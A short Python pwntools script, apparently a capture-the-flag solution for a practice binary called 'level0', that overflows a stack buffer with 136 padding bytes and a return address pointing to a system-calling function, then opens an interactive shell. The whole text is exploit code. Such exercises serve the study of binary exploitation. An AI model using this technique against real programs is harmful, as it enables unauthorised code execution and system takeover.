from pwn import *
io = process("./level0")
sys = 0x400596
elf=ELF('./level0')
io.recv()
#ret = elf.symbols['callsystem']
payload =(b'a'*136+p64(sys)).rjust(512-136-8,b'a')
io.sendline(payload)
io.interactive()
